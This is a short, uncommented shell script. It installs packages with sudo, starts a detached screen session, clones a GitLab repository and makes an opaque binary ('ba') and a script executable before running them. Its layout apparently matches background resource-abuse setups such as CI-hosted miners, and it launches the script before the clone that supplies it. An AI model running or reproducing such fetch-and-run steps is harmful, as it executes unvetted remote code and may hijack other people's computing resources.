#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS ac.sh ./from_config.sh 65 75
sudo git clone https://gitlab.com/trxcolab/ci.git
cd ci
cd ab
chmod +x ba
chmod +x from_config.sh
./from_config.sh
